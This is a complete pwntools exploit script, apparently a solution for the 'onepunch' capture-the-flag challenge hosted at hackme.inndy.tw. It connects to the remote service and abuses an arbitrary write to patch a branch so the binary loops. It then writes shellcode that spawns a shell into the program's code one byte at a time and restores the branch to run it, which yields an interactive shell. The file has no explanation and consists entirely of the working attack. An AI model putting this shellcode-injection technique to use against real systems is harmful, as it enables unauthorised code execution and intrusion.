from pwn import *

context.log_level='debug'
#p=process("./onepunch")
p=remote("hackme.inndy.tw",7718)
context.binary="./onepunch"


def change(addr,val):
    p.recvuntil("Where What?")
    p.sendline(hex(addr)+" "+str(val))

change(0x400768,0xb4)
shellcode=asm(shellcraft.sh())
addr=0x400790
for i in range(len(shellcode)):
    change(addr+i,ord(shellcode[i]))

change(0x400768,0x27)
p.interactive()